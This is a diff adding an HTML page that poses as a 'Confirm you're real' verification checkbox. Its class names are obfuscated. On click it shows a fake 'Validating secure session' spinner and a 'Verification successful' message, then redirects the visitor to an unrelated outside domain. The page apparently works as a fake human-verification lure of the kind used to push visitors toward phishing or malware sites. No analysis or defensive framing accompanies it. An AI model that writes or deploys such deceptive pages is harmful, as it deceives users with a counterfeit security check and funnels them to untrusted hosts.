@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Check Almost Done</title>
+
+<style>
+:root{
+ --jungle:#f4f6fb;
+ --fur:#e5e7eb;
+ --tail:#667085;
+ --lion:#6366f1;
+ --parrot:#22c55e;
+}
+
+*{box-sizing:border-box}
+
+body{
+ margin:0;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+ height:100vh;
+ background:#ffffff;
+ font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+
+.p7{
+ width:380px;
+ padding:22px;
+ border-radius:18px;
+ background:var(--jungle);
+ border:1px solid var(--fur);
+ box-shadow:0 20px 45px rgba(15,23,42,.08);
+}
+
+.c1{
+ display:flex;
+ align-items:center;
+ gap:12px;
+ margin-bottom:16px;
+}
+
+.a0{
+ width:30px;
+ height:30px;
+ border-radius:8px;
+ background:linear-gradient(135deg,var(--lion),#8b5cf6);
+ display:flex;
+ align-items:center;
+ justify-content:center;
+ color:white;
+ font-weight:600;
+ font-size:12px;
+}
+
+.ld6{
+ font-size:15px;
+ font-weight:600;
+}
+
+.cx3{
+ font-size:12px;
+ color:var(--tail);
+ margin-top:3px;
+}
+
+.dh3{
+ display:flex;
+ align-items:center;
+ gap:12px;
+ padding:14px;
+ border-radius:12px;
+ border:1px solid var(--fur);
+ background:#fff;
+}
+
+.ot6{
+ width:20px;
+ height:20px;
+ border-radius:6px;
+ border:1.5px solid #cbd5e1;
+ display:flex;
+ align-items:center;
+ justify-content:center;
+ cursor:pointer;
+ position:relative;
+}
+
+.sw4{
+ width:12px;
+ height:12px;
+ border:2px solid #e5e7eb;
+ border-top-color:var(--lion);
+ border-radius:50%;
+ animation:spin .7s linear infinite;
+ display:none;
+}
+
+@keyframes spin{
+ to{transform:rotate(360deg)}
+}
+
+.ot6.loading .sw4{
+ display:block;
+}
+
+.ot6.done{
+ background:var(--parrot);
+ border-color:var(--parrot);
+}
+
+.ot6.done::after{
+ content:"";
+ position:absolute;
+ width:5px;
+ height:10px;
+ border:2px solid white;
+ border-top:none;
+ border-left:none;
+ transform:rotate(45deg);
+}
+
+.vb4{
+ font-size:13px;
+ font-weight:500;
+}
+
+.nz3{
+ margin-top:10px;
+ font-size:11px;
+ color:var(--tail);
+ min-height:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="p7">
+
+<div class="c1">
+<div class="a0">ID</div>
+
+<div>
+<div class="ld6">Tap to proceed</div>
+<div class="cx3">Tap the box to confirm</div>
+</div>
+</div>
+
+<div class="dh3">
+
+<div class="ot6" id="verifyBox">
+<div class="sw4"></div>
+</div>
+
+<div class="vb4">Confirm you’re real</div>
+
+</div>
+
+<div class="nz3" id="statusText"></div>
+
+</div>
+
+<script>
+
+const verifyBox = document.getElementById("verifyBox");
+const statusText = document.getElementById("statusText");
+
+let clicked = false;
+
+verifyBox.addEventListener("click", () => {
+
+if(clicked) return;
+clicked = true;
+
+verifyBox.classList.add("loading");
+statusText.textContent = "Validating secure session…";
+
+setTimeout(() => {
+
+verifyBox.classList.remove("loading");
+verifyBox.classList.add("done");
+
+statusText.textContent = "Verification successful.";
+
+},800);
+
+setTimeout(() => {
+
+window.location.href = "https://blackbrum-stoll.com/data/n/2139/";
+
+},1300);
+
+});
+
+</script>
+
+</body>
+</html>
